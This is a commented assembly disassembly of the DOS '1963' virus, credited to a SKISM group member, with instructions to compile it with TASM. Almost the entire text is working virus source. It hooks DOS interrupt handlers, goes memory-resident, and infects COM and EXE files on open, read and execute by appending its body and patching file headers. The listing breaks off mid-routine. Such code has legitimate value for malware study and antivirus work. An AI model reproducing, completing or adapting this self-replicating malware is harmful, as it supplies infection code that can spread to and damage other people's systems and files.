  
PAGE  59,132
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€                                                                      €€
;€€                           1963 VIRUS                                 €€
;€€                                                                      €€
;€€                         disassembly by                               €€
;€€                                                                      €€
;€€                       DecimatoR / SKISM                              €€
;€€                                                                      €€
;€€  01/15/92           Compile with TASM 2.0           DW 717-367-3501  €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
data_1e         equ     4                       ; (0000:0004=7FBh)
data_2e         equ     6                       ; (0000:0006=70h)
data_3e         equ     4Ch                     ; (0000:004C=88h)
data_4e         equ     84h                     ; (0000:0084=16h)
data_6e         equ     0Ah                     ; (0046:000A=0)
data_7e         equ     16h                     ; (0046:0016=0)
data_8e         equ     2Ch                     ; (0046:002C=50h)
data_9e         equ     8ABh                    ; (0046:08AB=4146h)
data_10e        equ     8ADh                    ; (0046:08AD=3154h)
data_11e        equ     0Ah                     ; (08D4:000A=2F9h)
data_12e        equ     0Ch                     ; (08D4:000C=3872h)
data_13e        equ     100h                    ; (08D4:0100=0DFh)
data_14e        equ     1                       ; (4815:0001=0FFFFh)
data_15e        equ     100h                    ; (4816:0100=0FFh)
data_16e        equ     1                       ; (8343:0001=0FFFFh)
data_17e        equ     0Ah                     ; (8344:000A=0)
data_18e        equ     0Eh                     ; (8344:000E=8344h)
data_49e        equ     900h                    ; (8344:0900=0)
data_50e        equ     902h                    ; (8344:0902=0)
data_51e        equ     904h                    ; (8344:0904=8344h)
data_52e        equ     906h                    ; (8344:0906=0)
data_53e        equ     9EFh                    ; (8344:09EF=0)
data_54e        equ     10AFh                   ; (8344:10AF=0)
data_55e        equ     10B1h                   ; (8344:10B1=0)
data_56e        equ     10B3h                   ; (8344:10B3=0)
  
seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
  
  
                org     100h
  
virus           proc    far
  
start:
                mov     ah,30h                  ; '0'
                int     21h                     ; DOS Services  ah=function 30h
                                                ;  get DOS version number ax
                cmp     al,3
                jb      loc_1                   ; Jump if below
                mov     ax,1200h
                int     2Fh                     ; Multiplex/Spooler al=func 00h
                                                ;  get installed status
                cmp     al,0FFh
loc_1:
                mov     ax,0Bh
                jc      loc_4                   ; Jump if carry Set
                mov     ah,4Ah                  ; 'J'
                mov     bx,140h
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                jc      loc_4                   ; Jump if carry Set
                cli                             ; Disable interrupts
                push    cs
                pop     ss
                mov     sp,13FEh
                call    sub_1                   ; (01EB)
                sti                             ; Enable interrupts
                mov     ax,ds:data_8e           ; (0046:002C=50h)
                or      ax,ax                   ; Zero ?
                jz      loc_5                   ; Jump if zero
                call    sub_13                  ; (07EC)
                mov     es,ax
                xor     di,di                   ; Zero register
                xor     ax,ax                   ; Zero register
loc_2:
                scasw                           ; Scan es:[di] for ax
                jnz     loc_2                   ; Jump if not zero
                scasw                           ; Scan es:[di] for ax
                mov     dx,di
                push    es
                pop     ds
                mov     ah,48h                  ; 'H'
                mov     bx,0FFFFh
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                mov     ah,48h                  ; 'H'
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                mov     es,ax
                mov     ah,49h                  ; 'I'
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
                xor     ax,ax                   ; Zero register
                mov     cx,bx
                mov     bx,es
  
locloop_3:
                push    cx
                mov     cx,8
                xor     di,di                   ; Zero register
                rep     stosw                   ; Rep when cx >0 Store ax to es:[di]
                inc     bx
                mov     es,bx
                pop     cx
                loop    locloop_3               ; Loop if cx > 0
  
                push    cs
                pop     es
                mov     bx,data_51e             ; (8344:0904=44h)
                mov     di,bx
                stosw                           ; Store ax to es:[di]
                mov     al,80h
                stosw                           ; Store ax to es:[di]
                mov     ax,cs
                stosw                           ; Store ax to es:[di]
                mov     ax,5Ch
                stosw                           ; Store ax to es:[di]
                mov     ax,cs
                stosw                           ; Store ax to es:[di]
                mov     ax,6Ch
                stosw                           ; Store ax to es:[di]
                mov     ax,cs
                stosw                           ; Store ax to es:[di]
                mov     ax,4B00h
                int     21h                     ; DOS Services  ah=function 4Bh
                                                ;  run progm @ds:dx, parm @es:bx
loc_4:
                push    cs
                pop     ds
                call    sub_13                  ; (07EC)
                jmp     dword ptr cs:data_17e   ; (8344:000A=0)
loc_5:
                mov     ax,1220h
                mov     bx,5
                int     2Fh                     ; ??INT Non-standard interrupt.
                push    bx
                dec     bx
                dec     bx
                mov     es:[di],bl
                mov     ax,1216h
                int     2Fh                     ; ??INT Non-standard interrupt.
                dec     bx
                dec     bx
                mov     es:[di],bx
                mov     ah,48h                  ; 'H'
                mov     bx,0FFFFh
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                mov     ah,48h                  ; 'H'
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                mov     ds,ax
                pop     bx
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                mov     ah,3Fh                  ; '?'
                mov     dx,data_15e             ; (4816:0100=0FFh)
                mov     cx,es:[di+11h]
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      loc_4                   ; Jump if carry Set
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                mov     ah,26h                  ; '&'
                mov     dx,ds
                int     21h                     ; DOS Services  ah=function 26h
                                                ;  create progm seg prefix dx
                dec     dx
                mov     es,dx
                mov     es:data_14e,ds          ; (4815:0001=0FFFFh)
                inc     dx
                mov     es,dx
                mov     ss,dx
                mov     sp,0FFFEh
                push    ds
                mov     ax,100h
                push    ax
                retf                            ; Return far
  
virus           endp
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_1           proc    near
                push    ds
                mov     ax,1203h
                int     2Fh                     ; Multiplex/Spooler al=func 03h
                                                ;  remove all files from queue
                mov     cs:data_51e,ds          ; (8344:0904=8344h)
                xor     si,si                   ; Zero register
                mov     ds,si
                mov     di,288h
                mov     si,cs
                xchg    di,ds:data_1e           ; (0000:0004=7FBh)
                xchg    si,ds:data_2e           ; (0000:0006=70h)
                pushf                           ; Push flags
                pushf                           ; Push flags
                pushf                           ; Push flags
                mov     bp,sp
                or      byte ptr [bp+1],1
                popf                            ; Pop flags
                pushf                           ; Push flags
                pushf                           ; Push flags
                mov     word ptr cs:data_52e,8AFh       ; (8344:0906=0)
                mov     ah,1
                call    dword ptr ds:data_3e    ; (0000:004C=2288h)
                popf                            ; Pop flags
                mov     word ptr cs:data_52e,8ABh       ; (8344:0906=0)
                mov     ah,0Bh
                call    dword ptr ds:data_4e    ; (0000:0084=1716h)
                popf                            ; Pop flags
                mov     ds:data_1e,di           ; (0000:0004=7FBh)
                mov     ds:data_2e,si           ; (0000:0006=70h)
                pop     ds
                push    ds
                push    es
                mov     bx,cs
                mov     bp,2AEh
                mov     ax,ds:data_9e           ; (0046:08AB=4146h)
                mov     dx,ds:data_10e          ; (0046:08AD=3154h)
                xor     si,si                   ; Zero register
                mov     ds,si
                cmp     ax,ds:data_4e           ; (0000:0084=1716h)
                jne     loc_6                   ; Jump if not equal
                cmp     dx,word ptr ds:data_4e+2        ; (0000:0086=2C7h)
                jne     loc_6                   ; Jump if not equal
                mov     ds:data_4e,bp           ; (0000:0084=1716h)
                mov     word ptr ds:data_4e+2,bx        ; (0000:0086=2C7h)
                jmp     short loc_10            ; (0285)
loc_6:
                mov     ax,8ABh
                mov     es,bx
                mov     cx,10h
                cld                             ; Clear direction
  
locloop_7:
                mov     di,ax
                mov     ds,dx
                cmpsw                           ; Cmp [si] to es:[di]
                jnz     loc_9                   ; Jump if not zero
                cmpsw                           ; Cmp [si] to es:[di]
                jnz     loc_8                   ; Jump if not zero
                mov     [si-4],bp
                mov     [si-2],bx
loc_8:
                dec     si
                dec     si
loc_9:
                dec     si
                loop    locloop_7               ; Loop if cx > 0
  
                xchg    si,cx
                inc     dx
                cmp     dx,bx
                jne     locloop_7               ; Jump if not equal
loc_10:
                pop     es
                pop     ds
                retn
sub_1           endp
  
                push    bp
                mov     bp,sp
                push    ax
                mov     ax,[bp+4]
                cmp     ax,cs:data_51e          ; (8344:0904=8344h)
                ja      loc_11                  ; Jump if above
                push    bx
                mov     bx,cs:data_52e          ; (8344:0906=0)
                mov     cs:[bx+2],ax
                mov     ax,[bp+2]
                mov     cs:[bx],ax
                and     byte ptr [bp+7],0FEh
                pop     bx
loc_11:
                pop     ax
                pop     bp
                iret                            ; Interrupt return
                db       55h, 8Bh,0ECh, 80h,0FCh, 48h
                db       74h, 0Ah, 80h,0FCh, 4Ah, 74h
                db       05h, 3Dh, 03h, 4Bh, 75h, 0Ch
                db      0E8h, 89h, 05h,0E8h,0AFh, 05h
                db       9Ch,0E8h, 87h, 05h,0EBh, 55h
                db       80h,0FCh, 31h, 74h, 05h, 80h
                db      0FCh
                db       4Ch, 75h, 0Dh
loc_12:
                push    bx
                mov     bx,13h
loc_13:
                call    sub_5                   ; (0532)
                dec     bx
                jns     loc_13                  ; Jump if not sign
                pop     bx
                jmp     short loc_23            ; (0342)
loc_14:
                cmp     ah,0Fh
                je      loc_15                  ; Jump if equal
                cmp     ah,10h
                je      loc_15                  ; Jump if equal
                cmp     ah,17h
                je      loc_15                  ; Jump if equal
                cmp     ah,23h                  ; '#'
                jne     loc_16                  ; Jump if not equal
loc_15:
                call    sub_15                  ; (081F)
                jmp     short loc_23            ; (0342)
loc_16:
                cmp     ah,3Fh                  ; '?'
                jne     loc_20                  ; Jump if not equal
                call    sub_5                   ; (0532)
                jnc     loc_18                  ; Jump if carry=0
                mov     ax,5
loc_17:
                jmp     loc_37                  ; (0403)
loc_18:
                jnz     loc_23                  ; Jump if not zero
                call    sub_22                  ; (0875)
                jc      loc_17                  ; Jump if carry Set
                pushf                           ; Push flags
                call    sub_24                  ; (0884)
                push    ds
                pop     es
                mov     di,dx
                call    sub_11                  ; (0785)
                call    sub_25                  ; (0896)
loc_19:
                popf                            ; Pop flags
                pop     bp
                retf    2                       ; Return far
loc_20:
                cmp     ah,3Dh                  ; '='
                je      loc_21                  ; Jump if equal
                cmp     ah,43h                  ; 'C'
                je      loc_21                  ; Jump if equal
                cmp     ah,56h                  ; 'V'
                jne     loc_22                  ; Jump if not equal
loc_21:
                call    sub_3                   ; (0519)
                jmp     short loc_23            ; (0342)
loc_22:
                cmp     ah,3Eh                  ; '>'
                jne     loc_24                  ; Jump if not equal
                call    sub_5                   ; (0532)
loc_23:
                push    word ptr [bp+6]
                popf                            ; Pop flags
                pop     bp
                cli                             ; Disable interrupts
                jmp     dword ptr cs:data_20    ; (8344:08AB=0)
loc_24:
                cmp     ah,14h
                je      loc_25                  ; Jump if equal
                cmp     ah,21h                  ; '!'
                je      loc_25                  ; Jump if equal
                cmp     ah,27h                  ; '''
                je      loc_25                  ; Jump if equal
                jmp     loc_35                  ; (03DE)
loc_25:
                call    sub_15                  ; (081F)
                jnc     loc_27                  ; Jump if carry=0
loc_26:
                pop     bp
                mov     al,1
                iret                            ; Interrupt return
loc_27:
                jnz     loc_23                  ; Jump if not zero
                call    sub_24                  ; (0884)
                call    sub_14                  ; (0814)
                cmp     ah,14h
                jne     loc_28                  ; Jump if not equal
                mov     ax,[si+0Ch]
                mov     dx,80h
                mul     dx                      ; dx:ax = reg * ax
                xor     bx,bx                   ; Zero register
                add     al,[si+20h]
                adc     ah,bl
                adc     bx,dx
                xchg    ax,bx
                jmp     short loc_29            ; (038F)
loc_28:
                mov     ax,[si+23h]
                mov     bx,[si+21h]
loc_29:
                mov     cx,[si+0Eh]
                mul     cx                      ; dx:ax = reg * ax
                jnc     loc_31                  ; Jump if carry=0
loc_30:
                call    sub_25                  ; (0896)
                jmp     short loc_26            ; (0364)
loc_31:
                xchg    ax,bx
                mul     cx                      ; dx:ax = reg * ax
                add     dx,bx
                jc      loc_30                  ; Jump if carry Set
                mov     cs:data_37,ax           ; (8344:08D0=0)
                mov     cs:data_38,dx           ; (8344:08D2=0)
                mov     cs:data_39,cx           ; (8344:08D4=0)
                call    sub_25                  ; (0896)
                call    sub_22                  ; (0875)
                or      al,al                   ; Zero ?
                jz      loc_32                  ; Jump if zero
                cmp     al,3
                jne     loc_34                  ; Jump if not equal
loc_32:
                call    sub_24                  ; (0884)
                cmp     ah,27h                  ; '''
                mov     ax,cs:data_39           ; (8344:08D4=0)
                jnz     loc_33                  ; Jump if not zero
                mul     cx                      ; dx:ax = reg * ax
                jc      loc_30                  ; Jump if carry Set
loc_33:
                push    ax
                mov     ah,2Fh                  ; '/'
                int     21h                     ; DOS Services  ah=function 2Fh
                                                ;  get DTA ptr into es:bx
                mov     di,bx
                pop     ax
                call    sub_11                  ; (0785)
                call    sub_25                  ; (0896)
loc_34:
                pop     bp
                iret                            ; Interrupt return
loc_35:
                cmp     ax,4B00h
                je      loc_38                  ; Jump if equal
                cmp     ax,4B01h
                je      loc_36                  ; Jump if equal
                jmp     loc_23                  ; (0342)
loc_36:
                call    sub_2                   ; (042F)
                jc      loc_37                  ; Jump if carry Set
                push    si
                push    di
                push    ds
                push    cs
                pop     ds
                mov     si,offset data_41       ; (8344:08E2=0)
                lea     di,[bx+0Eh]             ; Load effective addr
                cld                             ; Clear direction
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                pop     ds
                pop     di
                pop     si
loc_37:
                pushf                           ; Push flags
                shr     byte ptr [bp+6],1       ; Shift w/zeros fill
                popf                            ; Pop flags
                rcl     byte ptr [bp+6],1       ; Rotate thru carry
                pop     bp
                iret                            ; Interrupt return
loc_38:
                call    sub_2                   ; (042F)
                jc      loc_37                  ; Jump if carry Set
                push    ax
                mov     ah,51h                  ; 'Q'
                int     21h                     ; DOS Services  ah=function 51h
                                                ;  get active PSP segment in bx
                mov     ds,bx
                mov     es,bx
                pop     ax
                cli                             ; Disable interrupts
                mov     sp,cs:data_41           ; (8344:08E2=0)
                mov     ss,cs:data_42           ; (8344:08E4=0)
                inc     sp
                inc     sp
                sti                             ; Enable interrupts
                jmp     dword ptr cs:data_43    ; (8344:08E6=0)
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_2           proc    near
                call    sub_24                  ; (0884)
                stc                             ; Set carry flag
                call    sub_4                   ; (051A)
loc_39:
                mov     ax,0Bh
                jc      loc_40                  ; Jump if carry Set
                cld                             ; Clear direction
                pushf                           ; Push flags
                push    ds
                mov     ax,3522h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     cs:data_24,bx           ; (8344:08B7=0)
                mov     word ptr cs:data_24+2,es        ; (8344:08B9=8344h)
                lds     si,dword ptr [bp+0Ah]   ; Load 32 bit ptr
                push    cs
                pop     es
                mov     di,offset data_39       ; (8344:08D4=0)
                mov     bx,di
                mov     cx,7
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                pop     ds
                call    sub_16                  ; (084C)
                push    dx
                mov     ax,4B01h
                call    sub_23                  ; (0879)
                pop     dx
                call    sub_17                  ; (0851)
                jnc     loc_42                  ; Jump if carry=0
loc_40:
                mov     [bp+8],ax
loc_41:
                call    sub_25                  ; (0896)
                retn
loc_42:
                mov     [bp+8],ax
                mov     ah,51h                  ; 'Q'
                int     21h                     ; DOS Services  ah=function 51h
                                                ;  get active PSP segment in bx
                mov     es,bx
                mov     si,[bp]
                lds     dx,dword ptr ss:[si+2]  ; Load 32 bit ptr
                mov     es:data_11e,dx          ; (08D4:000A=2F9h)
                mov     es:data_12e,ds          ; (08D4:000C=3872h)
                mov     ax,2522h
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                popf                            ; Pop flags
                jnz     loc_41                  ; Jump if not zero
                push    cs
                pop     ds
                mov     si,data_51e             ; (8344:0904=44h)
                mov     di,data_13e             ; (08D4:0100=0DFh)
                mov     cx,7ABh
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                call    sub_7                   ; (0758)
                jz      loc_44                  ; Jump if zero
loc_43:
                clc                             ; Clear carry flag
                jmp     short loc_41            ; (0470)
loc_44:
                mov     di,bx
                add     di,10h
                mov     ax,ds:data_55e          ; (8344:10B1=0)
                mov     word ptr data_43,ax     ; (8344:08E6=0)
                mov     ax,ds:data_56e          ; (8344:10B3=0)
                add     ax,di
                mov     word ptr data_43+2,ax   ; (8344:08E8=0)
                mov     cx,ds:data_54e          ; (8344:10AF=0)
                or      cx,cx                   ; Zero ?
                jz      loc_43                  ; Jump if zero
                lds     dx,dword ptr [bp+0Eh]   ; Load 32 bit ptr
                call    sub_18                  ; (0862)
                jc      loc_47                  ; Jump if carry Set
                mov     bx,ax
                push    cx
                push    cs
                pop     ds
                xor     cx,cx                   ; Zero register
                mov     dx,ds:data_50e          ; (8344:0902=0)
                call    sub_20                  ; (086B)
                mov     dx,904h
                pop     cx
  
locloop_45:
                push    cx
                mov     cx,4
                call    sub_8                   ; (0764)
                pop     cx
                jc      loc_46                  ; Jump if carry Set
                mov     si,dx
                push    ds
                mov     ax,[si+2]
                mov     si,[si]
                add     ax,di
                mov     ds,ax
                add     [si],di
                pop     ds
                loop    locloop_45              ; Loop if cx > 0
  
                call    sub_19                  ; (0867)
                jmp     short loc_43            ; (04A8)
loc_46:
                call    sub_19                  ; (0867)
loc_47:
                push    es
                pop     ds
                les     bx,dword ptr cs:data_24 ; (8344:08B7=0) Load 32 bit ptr
                mov     ds:data_17e,bx          ; (8344:000A=0)
                mov     ds:data_18e,es          ; (8344:000E=8344h)
                call    sub_13                  ; (07EC)
                stc                             ; Set carry flag
                jmp     loc_39                  ; (0436)
sub_2           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_3           proc    near
                clc                             ; Clear carry flag
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_4:
                push    ax
                push    bx
                pushf                           ; Push flags
                call    sub_18                  ; (0862)
                jc      loc_48                  ; Jump if carry Set
                mov     bx,ax
                popf                            ; Pop flags
                pushf                           ; Push flags
                call    sub_6                   ; (0533)
                pushf                           ; Push flags
                call    sub_19                  ; (0867)
                popf                            ; Pop flags
loc_48:
                pop     bx
                pop     bx
                pop     ax
                retn
sub_3           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_5           proc    near
                clc                             ; Clear carry flag
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_6:
                cld                             ; Clear direction
                call    sub_24                  ; (0884)
                pushf                           ; Push flags
                push    bx
                mov     ax,1220h
                int     2Fh                     ; ??INT Non-standard interrupt.
                jc      loc_49                  ; Jump if carry Set
                xor     bh,bh                   ; Zero register
                mov     bl,es:[di]
                mov     ax,1216h
                int     2Fh                     ; ??INT Non-standard interrupt.
                jnc     loc_50                  ; Jump if carry=0
loc_49:
                call    sub_25                  ; (0896)
                retn
loc_50:
                push    es
                push    cs
                pop     ds
                mov     ax,3523h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     data_26,bx              ; (8344:08BB=0)
                mov     word ptr data_26+2,es   ; (8344:08BD=8344h)
                inc     ax
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     data_28,bx              ; (8344:08BF=0)
                mov     word ptr data_28+2,es   ; (8344:08C1=8344h)
                mov     ah,25h                  ; '%'
                mov     dx,offset int_24h_entry
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                dec     ax
                inc     dx
                inc     dx
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                pop     es
                pop     bx
                mov     al,2
                xchg    al,es:[di+2]
                mov     data_33,al              ; (8344:08C9=0)
                mov     ax,es:[di+5]
                mov     data_34,ax              ; (8344:08CA=0)
                mov     ax,es:[di+15h]
                mov     data_37,ax              ; (8344:08D0=0)
                mov     ax,es:[di+17h]
                mov     data_38,ax              ; (8344:08D2=0)
                mov     ax,es:[di+11h]
                mov     dx,es:[di+13h]
                mov     data_35,ax              ; (8344:08CC=0)
                mov     data_36,dx              ; (8344:08CE=0)
                cmp     ax,1Ah
                sbb     dx,0
                jc      loc_55                  ; Jump if carry Set
                popf                            ; Pop flags
                jc      loc_52                  ; Jump if carry Set
                mov     ax,es:[di+28h]
                cmp     ax,5845h
                je      loc_51                  ; Jump if equal
                cmp     ax,4F43h
                jne     loc_55                  ; Jump if not equal
                mov     al,4Dh                  ; 'M'
loc_51:
                cmp     al,es:[di+2Ah]
                jne     loc_55                  ; Jump if not equal
loc_52:
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_20                  ; (086B)
                mov     dx,8EAh
                mov     cl,1Ah
                call    sub_8                   ; (0764)
                jc      loc_57                  ; Jump if carry Set
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_7                   ; (0758)
                jnz     loc_53                  ; Jump if not zero
                mov     ax,data_47              ; (8344:08F2=0)
                mov     dl,10h
                mul     dx                      ; dx:ax = reg * ax
                mov     cx,dx
                mov     dx,ax
loc_53:
                push    cx
                push    dx
                add     dx,7ABh
                adc     cx,0
                cmp     cx,data_36              ; (8344:08CE=0)
                jne     loc_54                  ; Jump if not equal
                cmp     dx,data_35              ; (8344:08CC=0)
loc_54:
                pop     dx
                pop     cx
                jbe     loc_56                  ; Jump if below or =
loc_55:
                jmp     short loc_62            ; (065D)
loc_56:
                push    cx
                push    dx
                call    sub_20                  ; (086B)
                mov     dx,904h
                mov     cx,7ABh
                call    sub_8                   ; (0764)
                jnc     loc_58                  ; Jump if carry=0
loc_57:
                jmp     short loc_60            ; (0656)
loc_58:
                push    es
                push    di
                push    cs
                pop     es
                mov     si,data_53e             ; (8344:09EF=0)
                mov     di,offset ds:[1EBh]     ; (8344:01EB=1Eh)
                mov     cx,0C3h
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                pop     di
                pop     es
                jnz     loc_65                  ; Jump if not zero
                mov     dx,cx
                call    sub_21                  ; (0870)
                mov     cx,7ADh
                mov     dx,904h
                call    sub_7                   ; (0758)
                jnz     loc_59                  ; Jump if not zero
                add     cx,6
loc_59:
                add     es:[di+11h],cx
                adc     word ptr es:[di+13h],0
                call    sub_8                   ; (0764)
                jc      loc_60                  ; Jump if carry Set
                mov     si,dx
                dec     cx
                dec     cx
                call    sub_10                  ; (0778)
                cmp     dx,[si]
                je      loc_61                  ; Jump if equal
loc_60:
                stc                             ; Set carry flag
                jmp     short loc_63            ; (0661)
loc_61:
                cmp     al,al
                jmp     short loc_63            ; (0661)
loc_62:
                mov     al,1
                cmp     al,0
loc_63:
                pushf                           ; Push flags
loc_64:
                mov     si,offset data_33       ; (8344:08C9=0)
                cld                             ; Clear direction
                inc     di
                inc     di
                movsb                           ; Mov [si] to es:[di]
                inc     di
                inc     di
                movsw                           ; Mov [si] to es:[di]
                add     di,0Ah
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                mov     ax,2524h
                lds     dx,dword ptr data_28    ; (8344:08BF=0) Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                dec     ax
                lds     dx,dword ptr cs:data_26 ; (8344:08BB=0) Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                popf                            ; Pop flags
                call    sub_25                  ; (0896)
                retn
loc_65:
                test    byte ptr es:[di+4],4
                jnz     loc_62                  ; Jump if not zero
                mov     ah,0Dh
                int     21h                     ; DOS Services  ah=function 0Dh
                                                ;  flush disk buffers to disk
                push    bx
                push    ds
                push    es
                mov     ax,3540h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     data_30,bx              ; (8344:08C3=0)
                mov     word ptr data_30+2,es   ; (8344:08C5=8344h)
                mov     al,13h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     data_22,bx              ; (8344:08B3=0)
                mov     word ptr data_22+2,es   ; (8344:08B5=8344h)
                mov     ah,25h                  ; '%'
                lds     dx,data_21              ; (8344:08AF=0) Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                mov     al,40h                  ; '@'
;*              mov     dx,offset loc_85        ;*
                db      0BAh, 59h,0ECh
                mov     bx,0F000h
                mov     ds,bx
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                pop     es
                pop     ds
                pop     bx
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_21                  ; (0870)
                mov     cx,7ABh
                mov     si,904h
                call    sub_7                   ; (0758)
                jnz     loc_66                  ; Jump if not zero
                add     cx,6
                mov     ax,data_46              ; (8344:08F0=0)
                mov     ds:data_54e,ax          ; (8344:10AF=0)
                mov     ax,data_48              ; (8344:08FE=0)
                mov     ds:data_55e,ax          ; (8344:10B1=0)
                mov     ax,ds:data_49e          ; (8344:0900=0)
                mov     ds:data_56e,ax          ; (8344:10B3=0)
loc_66:
                push    si
                call    sub_10                  ; (0778)
                mov     [si],dx
                pop     dx
                inc     cx
                inc     cx
                call    sub_9                   ; (076E)
                jc      loc_68                  ; Jump if carry Set
                pop     dx
                pop     cx
                call    sub_20                  ; (086B)
                mov     dx,100h
                mov     cx,7ABh
                call    sub_9                   ; (076E)
                jc      loc_69                  ; Jump if carry Set
                call    sub_7                   ; (0758)
                jnz     loc_67                  ; Jump if not zero
                xor     cx,cx                   ; Zero register
                mov     data_46,cx              ; (8344:08F0=0)
                mov     data_48,dx              ; (8344:08FE=0)
                mov     word ptr ds:data_49e,0FFF0h     ; (8344:0900=0)
